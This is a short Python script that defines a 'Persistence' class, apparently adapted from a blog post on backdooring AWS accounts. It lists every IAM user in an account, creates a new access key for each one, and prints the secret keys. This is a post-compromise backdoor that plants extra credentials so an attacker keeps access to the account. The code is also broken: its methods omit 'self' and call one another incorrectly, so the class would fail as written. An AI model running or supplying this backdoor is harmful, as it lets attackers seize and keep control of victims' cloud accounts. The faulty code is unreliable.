#!/usr/bin/env python
from __future__ import print_function
import boto3
from botocore.exceptions import ClientError
import json


"""
Persistence class totally ripped off from:
https://danielgrzelak.com/backdooring-an-aws-account-da007d36f8f9#.i79n5zly6

All I did was turn this into an object! Easy right?
"""

class Persistence(object):
    def __init__(self):
        self.users = self.get_users()

    def get_users():
        client = boto3.client('iam')
        response = None
        user_names = []
        marker = None

        # By default, only 100 users are returned at a time.
        # 'Marker' is used for pagination.
        while (response is None or response['IsTruncated']):
            # Marker is only accepted if result was truncated.
            if marker is None:
                response = client.list_users()
            else:
                response = client.list_users(Marker=marker)

            users = response['Users']
            for user in users:
                user_names.append(user['UserName'])

            if response['IsTruncated']:
                marker = response['Marker']

        return user_names

    def backdoor_users(user_names):
        for user_name in user_names:
            backdoor_user(user_name)

    def backdoor_user(user_name):
        print(user_name)
        client = boto3.client('iam')
        try:
            response = client.create_access_key(UserName=user_name)
            print("  " + response['AccessKey']['AccessKeyId'])
            print("  " + response['AccessKey']['SecretAccessKey'])
        except ClientError as e:
            print("  " + e.response['Error']['Message'])
